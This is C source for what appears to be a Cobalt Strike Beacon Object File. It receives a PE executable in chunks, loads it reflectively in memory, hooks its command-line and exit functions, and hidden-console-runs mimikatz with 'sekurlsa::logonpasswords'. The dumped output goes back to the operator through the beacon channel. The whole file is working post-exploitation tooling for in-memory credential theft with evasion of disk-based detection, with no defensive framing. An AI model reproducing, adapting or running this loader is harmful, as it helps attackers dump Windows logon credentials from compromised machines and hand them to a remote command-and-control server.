#include "bofdefs.h"
#include "beacon.h"
#pragma warning (disable: 4996)
const char* file = "C:\\Users\\fuckmiansha\\Desktop\\mimikatz.exe";
char* parameter = (char*)"a privilege::debug sekurlsa::logonpasswords exit";
wchar_t* cmdWidh = NULL;
wchar_t** cmdWidhArgv = NULL;
int cmdWidhArgvInt = 0;
char** cmdAnsiArgv = NULL;
BOOL hijackCmdline = FALSE;
#define _WAIT_TIMEOUT 5000


FILE* __cdecl __acrt_iob_funcs(int index)
{
	return &__iob_func()[index];      
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

LPWSTR hookGetCommandLineW()
{
	return cmdWidh;
}
LPSTR hookGetCommandLineA()
{
	return parameter;
}
char*** __cdecl hook__p___argv(void)
{
	return &cmdAnsiArgv;
}
wchar_t*** __cdecl hook__p___wargv(void)
{
	return &cmdWidhArgv;
}
int* __cdecl hook__p___argc(void)
{
	return &cmdWidhArgvInt;
}
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
	*_Argc = cmdWidhArgvInt;
	*_Argv = cmdWidhArgv;

	return 0;
}
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
	*_Argc = cmdWidhArgvInt;
	*_Argv = cmdAnsiArgv;
	return 0;
}
_onexit_t __cdecl hook_onexit(_onexit_t function)
{
	return 0;
}
int __cdecl hookatexit(void(__cdecl* func)(void))
{
	return 0;
}
int __cdecl hookexit(int status)
{
	ExitThread(0);
	return 0;
}
void __stdcall hookExitProcess(UINT statuscode)
{
	ExitThread(0);
}
typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;

//int __cdecl hook_wprintf(const wchar_t* format, ...) {
//	va_list args;
//	va_start(args, format);
//
//	wchar_t buffer[1024];
//	_vsnwprintf_s(buffer, _countof(buffer), _TRUNCATE, format, args);
//
//	BeaconPrintf(CALLBACK_OUTPUT, "%ls", buffer);
//
//	va_end(args);
//	return wcslen(buffer);
//}
//
//int __cdecl hook_vwprintf(const wchar_t* format, va_list args) {
//	wchar_t buffer[1024];
//	_vsnwprintf_s(buffer, _countof(buffer), _TRUNCATE, format, args);
//
//	BeaconPrintf(CALLBACK_OUTPUT, "%ls", buffer);
//	return wcslen(buffer);
//}

PIMAGE_DATA_DIRECTORY GetPeDataDir(PIMAGE_NT_HEADERS pNtHeader, SIZE_T dataID) {
	if (dataID >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
		return NULL;
	}
	return (PIMAGE_DATA_DIRECTORY) & (pNtHeader->OptionalHeader.DataDirectory[dataID]);
}

void masqueradeParameters() {
	// 将参数转换为宽字符串
	int charSize = MultiByteToWideChar(CP_UTF8, 0, parameter, -1, NULL, 0);
	cmdWidh = calloc(charSize + 1, sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, parameter, -1, cmdWidh, charSize);

	// 解析宽字符串参数
	cmdWidhArgv = CommandLineToArgvW(cmdWidh, &cmdWidhArgvInt);

	// 计算转换为 ANSI 字符串所需的内存大小
	int retval;
	int memsize = cmdWidhArgvInt * sizeof(LPSTR);
	for (int i = 0; i < cmdWidhArgvInt; ++i) {
		retval = WideCharToMultiByte(CP_UTF8, 0, cmdWidhArgv[i], -1, NULL, 0, NULL, NULL);
		memsize += retval;
	}

	// 分配内存存储 ANSI 版本的参数
	cmdAnsiArgv = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
	int bufLen = memsize - cmdWidhArgvInt * sizeof(LPSTR);
	LPSTR buffer = ((LPSTR)cmdAnsiArgv) + cmdWidhArgvInt * sizeof(LPSTR);

	// 将宽字符串参数转换为 ANSI 并存储
	for (int i = 0; i < cmdWidhArgvInt; ++i) {
		retval = WideCharToMultiByte(CP_UTF8, 0, cmdWidhArgv[i], -1, buffer, bufLen, NULL, NULL);
		cmdAnsiArgv[i] = buffer;
		buffer += retval;
		bufLen -= retval;
	}

	// 标记参数已修改
	hijackCmdline = TRUE;
}

BOOL FixIAT(ULONG_PTR pImageBase) {
	//printf("[*] Fix Import Table\n");
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
	PIMAGE_DATA_DIRECTORY pImportDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (pImportDir == NULL) {
		return FALSE;
	}

	ULONG_PTR maxSize = pImportDir->Size;
	ULONG_PTR pImportTablesAddress = pImportDir->VirtualAddress;
	PIMAGE_IMPORT_DESCRIPTOR pImportTable = NULL;
	ULONG_PTR parsedSize = 0;
	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)pImageBase + pImportTablesAddress + parsedSize);
		if (pImportTable->OriginalFirstThunk == NULL && pImportTable->FirstThunk == NULL) {
			break;
		}

		LPSTR importName = (LPSTR)((ULONG_PTR)pImageBase + pImportTable->Name);
		//BeaconPrintf(CALLBACK_OUTPUT, "00000000000[+] Import Name: %s\n", importName);

		ULONG_PTR pINT = pImportTable->OriginalFirstThunk;
		ULONG_PTR pIAT = pImportTable->FirstThunk;
		ULONG_PTR offsetINT = 0;
		ULONG_PTR offsetIAT = 0;

		while (TRUE) {
			PIMAGE_THUNK_DATA pCurrentINT = (PIMAGE_THUNK_DATA)((ULONG_PTR)pImageBase + pINT + offsetINT);
			PIMAGE_THUNK_DATA pCurrentIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)pImageBase + pIAT + offsetIAT);

			// Ordinal处理
			if (pCurrentINT->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || pCurrentINT->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
				SIZE_T pWINAPI = (SIZE_T)GetProcAddress(LoadLibraryA(importName), (char*)(pCurrentINT->u1.Ordinal & 0xFFFF));
				if (pWINAPI != 0) {
					//printf("\t\t[+] API %x at %x\n", pCurrentINT->u1.Ordinal, pWINAPI);
					pCurrentIAT->u1.Function = pWINAPI;
				}
			}

			if (pCurrentIAT->u1.Function == NULL) {
				break;
			}

			if (pCurrentIAT->u1.Function == pCurrentINT->u1.Function) {
				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pImageBase + pCurrentINT->u1.AddressOfData);
				LPSTR funcName = (LPSTR)pImportByName->Name;
				SIZE_T pWINAPI = (SIZE_T)GetProcAddress(LoadLibraryA(importName), funcName);
				//BeaconPrintf(CALLBACK_OUTPUT, "%s", funcName);
				if (hijackCmdline && _stricmp(funcName, "GetCommandLineA") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hookGetCommandLineA;
				}
				else if (hijackCmdline && _stricmp(funcName, "GetCommandLineW") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hookGetCommandLineW;
				}
				else if (hijackCmdline && _stricmp(funcName, "__wgetmainargs") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hook__wgetmainargs;
				}
				else if (hijackCmdline && _stricmp(funcName, "__getmainargs") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hook__getmainargs;
				}
				else if (hijackCmdline && _stricmp(funcName, "__p___argv") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hook__p___argv;
				}
				else if (hijackCmdline && _stricmp(funcName, "__p___wargv") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hook__p___wargv;
				}
				else if (hijackCmdline && _stricmp(funcName, "__p___argc") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hook__p___argc;
				}
				else if (hijackCmdline && (_stricmp(funcName, "exit") == 0 || _stricmp(funcName, "_Exit") == 0 || _stricmp(funcName, "_exit") == 0 || _stricmp(funcName, "quick_exit") == 0))
				{
					pCurrentIAT->u1.Function = (size_t)hookexit;
				}
				else if (hijackCmdline && (_stricmp(funcName, "ExitProcess") == 0)|| _stricmp(funcName, "ExitThread") == 0)
				{
					pCurrentIAT->u1.Function = (size_t)hookExitProcess;
				}
				//else if (hijackCmdline && _stricmp(funcName, "vwprintf") == 0)
				//{
				//	pCurrentIAT->u1.Function = (size_t)hook_vwprintf;
				//}
				//else if (hijackCmdline && _stricmp(funcName, "wprintf") == 0)
				//{
				//	pCurrentIAT->u1.Function = (size_t)hook_wprintf;
				//}
				else
					pCurrentIAT->u1.Function = pWINAPI;

			}
			offsetIAT += sizeof(IMAGE_THUNK_DATA);
			offsetINT += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL FixReloc(ULONG_PTR newImageBase, ULONG_PTR oldImageBase, BYTE* pImageBase, ULONG_PTR fileSize) {
	//printf("[*] FixReloc\n");
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
	PIMAGE_DATA_DIRECTORY pRelocDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (pRelocDir == NULL) {
		return FALSE;
	}

	// Get RelocTable' Size, Addr
	SIZE_T maxSize = pRelocDir->Size;
	SIZE_T pRelocTables = pRelocDir->VirtualAddress;

	SIZE_T parsedSize = 0;
	PIMAGE_BASE_RELOCATION pBaseReloc = NULL;
	for (; parsedSize < maxSize; parsedSize += pBaseReloc->SizeOfBlock) {
		pBaseReloc = (PIMAGE_BASE_RELOCATION)((SIZE_T)pImageBase + pRelocTables + parsedSize);
		if (pBaseReloc->VirtualAddress == NULL || pBaseReloc->SizeOfBlock == 0) {
			break;
		}

		SIZE_T relocEntryNum = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		SIZE_T page = pBaseReloc->VirtualAddress;
		BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)((SIZE_T)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
		for (SIZE_T i = 0; i < relocEntryNum; i++) {
			SIZE_T offset = entry->Offset;
			SIZE_T type = entry->Type;
			SIZE_T reloc = page + offset;
			if (entry == NULL || type == 0) {
				break;
			}

			if (reloc >= fileSize) {
				return FALSE;
			}
			SIZE_T* relocAddress = (SIZE_T*)((SIZE_T)pImageBase + reloc);
			//printf("\t[+] Apply Reloc Field at %x\n", relocAddress);

			(*relocAddress) = ((*relocAddress) - oldImageBase + newImageBase);
			entry = (BASE_RELOCATION_ENTRY*)((SIZE_T)entry + sizeof(BASE_RELOCATION_ENTRY));
		}
	}
	return (parsedSize != 0);
}

void outputForwardBeacon(struct MemAddrs* pMemAddrs) {
	
	//Allocate Console
	BOOL suc = AllocConsole();

	//Immediately hide window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//Reopen stdout/stderr and associate to new FILE* fout and ferr
	freopen_s(&pMemAddrs->fout, "CONOUT$", "r+", stdout);
	freopen_s(&pMemAddrs->ferr, "CONOUT$", "r+", stderr);

	//Set pMemAddrs->bCloseFHandles to TRUE by default
	//This distinction is necessary because depending on whether we bail on execution during perun, we have to alter how we cleanup
	pMemAddrs->bCloseFHandles = TRUE;

	//Create an Anonymous pipe for both stdout and stderr
	SECURITY_ATTRIBUTES sao = { sizeof(sao),NULL,TRUE };
	CreatePipe(&pMemAddrs->hreadout, &pMemAddrs->hwriteout, &sao, 0);

	//Set StandardOutput and StandardError in PEB to write-end of anonymous pipe
	SetStdHandle(STD_OUTPUT_HANDLE, pMemAddrs->hwriteout);
	SetStdHandle(STD_ERROR_HANDLE, pMemAddrs->hwriteout);

	//Create File Descriptor from the Windows Handles for write-end of anonymous pipe
	pMemAddrs->fo = _open_osfhandle((intptr_t)(pMemAddrs->hwriteout), _O_TEXT);

	//These redirect output from mimikatz
	//Reassign reopened FILE* for stdout/stderr to the File Descriptor for the anonymous pipe
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->fout));
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->ferr));

	//These redirect output from cmd.exe.  Not sure why these are valid/necessary given that _freopen_s SHOULD close original FD's (1 and 2)
	//Reassign original FD's for stdout/stderr to the File Descriptor for the anonymous pipe 
	_dup2(pMemAddrs->fo, 1);
	_dup2(pMemAddrs->fo, 2);

	//BOOL suc = AllocConsole();
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//
	//SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE }; 
	//if (!CreatePipe(&pMemAddrs->hreadout, &pMemAddrs->hwriteout, &sa, 0)) {
	//	BeaconPrintf(CALLBACK_OUTPUT, "CreatePipe failed (%d)\n", GetLastError());
	//	return;
	//}

	//// 让stdout和stderr指向写入端
	//SetStdHandle(STD_OUTPUT_HANDLE, pMemAddrs->hwriteout);
	//SetStdHandle(STD_ERROR_HANDLE, pMemAddrs->hwriteout);

	//// 让stdio库的stdout和stderr也使用新的句柄
	//FILE* fout = _fdopen(_open_osfhandle((intptr_t)pMemAddrs->hwriteout, 0), "w");
	//if (fout) {
	//	*stdout = *fout;
	//	BeaconPrintf(CALLBACK_OUTPUT, "111111");
	//}

	//FILE* ferr = _fdopen(_open_osfhandle((intptr_t)pMemAddrs->hwriteout, 0), "w");
	//if (ferr) { 
	//	*stderr = *ferr;
	//	BeaconPrintf(CALLBACK_OUTPUT, "111111");
	//}
	return;
}

int LoadPe(BYTE* buffer) {
	struct MemAddrs* pMemAddrs = malloc(sizeof(struct MemAddrs));
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((SIZE_T)buffer + pDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pRelocDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (pRelocDir == NULL) {
		return NULL;
	}

	ULONG_PTR preferAddress = pNtHeader->OptionalHeader.ImageBase;

	// NtUnmapViewOfSection
	BYTE* pImageBase = NULL;
	(NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection")((HANDLE)-1, (PVOID)pNtHeader->OptionalHeader.ImageBase);
	pImageBase = (BYTE*)VirtualAlloc(pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pImageBase == NULL && pRelocDir == NULL) {
		return -1;
	}
	else if (pImageBase == NULL && pRelocDir != NULL) {
		pImageBase = (BYTE*)VirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pImageBase == NULL) {
			return -1;
		}
	}
	
	//printf("[*] Mapping Sections\n");
	pNtHeader->OptionalHeader.ImageBase = pImageBase;
	memcpy(pImageBase, buffer, pNtHeader->OptionalHeader.SizeOfHeaders);
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)pNtHeader + sizeof(IMAGE_NT_HEADERS));
	for (SIZE_T i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
		//BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Mapping Section Name: %s\n", pSectionHeader[i].Name);
		memcpy(
			(LPVOID)((ULONG_PTR)pImageBase + pSectionHeader[i].VirtualAddress),
			(LPVOID)((SIZE_T)buffer + pSectionHeader[i].PointerToRawData),
			pSectionHeader[i].SizeOfRawData
		);
	}

	masqueradeParameters();
	outputForwardBeacon(pMemAddrs);

	//--------------------------------------------------------------------
	if (!FixIAT(pImageBase)) {
		return -1;
	}

	ULONG_PTR retAddress = (ULONG_PTR)(pImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint);
	if ((ULONG_PTR)pImageBase != preferAddress) {
		FixReloc((ULONG_PTR)pImageBase, (ULONG_PTR)preferAddress, pImageBase, pNtHeader->OptionalHeader.SizeOfImage);
	}

	BOOL isThreadFinished = FALSE; // Thread执行完成
	DWORD waitResult = -1; // WaitForSingleObject的结果
	LARGE_INTEGER frequency, before, after;
	(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceFrequency")(&frequency);
	(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceCounter")(&before);

	BeaconPrintf(CALLBACK_OUTPUT, "CreateThread");
	
	HANDLE hThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES , SIZE_T , LPTHREAD_START_ROUTINE , LPVOID , DWORD , LPDWORD ))GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread")(0, 0, (LPTHREAD_START_ROUTINE)retAddress, 0, 0, 0);
	(VOID(WINAPI*)(DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "Sleep")(3000);
	//ResumeThread(hThread);
	DWORD remainingDataOutput = 0;
	DWORD bytesRead = 0;
	unsigned char* recvBuffer = calloc(8192, sizeof(unsigned char));
	do {
		(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceCounter")(&after);
		if (((after.QuadPart - before.QuadPart) / frequency.QuadPart) > 5) {
			// 添加超时标记
			(BOOL(WINAPI*)(HANDLE, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "TerminateThread")(hThread, 0);
		}
		waitResult = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "WaitForSingleObject")(hThread, _WAIT_TIMEOUT);
		switch (waitResult) {
		case WAIT_ABANDONED:
			break;
		case WAIT_FAILED:
			break;
		case _WAIT_TIMEOUT:
			break;
		case WAIT_OBJECT_0:
			isThreadFinished = TRUE;
		}

		PeekNamedPipe((VOID*)pMemAddrs->hreadout, NULL, 0, NULL, &remainingDataOutput, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, "Peek bytes available: %d!\nGetLastError: %d", remainingDataOutput, GetLastError());

		//If there is data to be read, zero out buffer, read data, and send back to CS
		if (remainingDataOutput) {
			memset(recvBuffer, 0, 8192);
			bytesRead = 0;
			ReadFile((VOID*)pMemAddrs->hreadout, recvBuffer, 8192 - 1, &bytesRead, NULL);

			//Send output back to CS
			BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);

		}
	} while (!isThreadFinished);

	return 0;
}

void go(char* buffer, int len) {
	SIZE_T state = 0;
	datap parser;
	BeaconDataParse(&parser, buffer, len);
	char* peName = BeaconDataExtract(&parser, NULL);
	state = BeaconDataInt(&parser);
	SIZE_T totalSize = BeaconDataInt(&parser);
	SIZE_T index = BeaconDataInt(&parser);
	SIZE_T chunkSize = BeaconDataInt(&parser);
	BYTE* chunk = (BYTE*)BeaconDataExtract(&parser, NULL);
	char* xor = (char*)BeaconDataExtract(&parser, NULL);

	char fileMapName[] = "areyouok";
	//BeaconPrintf(CALLBACK_OUTPUT, "%s, %d, %d, %d, %d", peName, state, totalSize, index, chunkSize);
	//BeaconPrintf(CALLBACK_OUTPUT, "[+] %s, %s", chunk[0], chunk[1]);

	// 创建文件映射
	HANDLE hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, totalSize, fileMapName);
	if (hMapFile != NULL) {
		DWORD lastError = GetLastError();
		if (lastError == 183) {
			if (index == 0) {
				BeaconPrintf(CALLBACK_OUTPUT, "[+] FileMapping %s already exists", fileMapName);
			}
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] CreateFileMapping %s success, size: %d", fileMapName, totalSize);
		}
	}
	else {
		DWORD lastError = GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "[!] Could not CreateFileMapping %s, ERROR ID: %d", fileMapName, lastError);
		BeaconPrintf(CALLBACK_ERROR, "[!] Exiting BOF..");
		return;
	}

	// 映射内存
	BYTE* mapAddress = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, totalSize);
	if (mapAddress != NULL) {
		if (index == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] MapViewOfFile success addr: 0x%p size: %d", mapAddress, totalSize);
	}
	else {
		DWORD lastError = GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "[!] Could not MapViewOfFile, ERROR: %d", fileMapName, lastError);
		BeaconPrintf(CALLBACK_ERROR, "[!] Exiting BOF..");
		CloseHandle(mapAddress);
		CloseHandle(hMapFile);
		return;
	}

	memcpy((SIZE_T)mapAddress + index, chunk, chunkSize);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Uploading %d/%d", index + chunkSize, totalSize);
	if (state == 1) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Upload shellcode completed");
		//BeaconPrintf(CALLBACK_OUTPUT, "state==1 %x %x", mapAddress[0], mapAddress[1]);
		BYTE* copyBuffer = (BYTE*)VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		memcpy(copyBuffer, mapAddress, totalSize);
		CloseHandle(hMapFile);
		CloseHandle(mapAddress);
		LoadPe(copyBuffer);
	}
	//BeaconPrintf(CALLBACK_OUTPUT, "%x %x", mapAddress[0], mapAddress[1]);
	//CloseHandle(hMapFile);
	return;
}
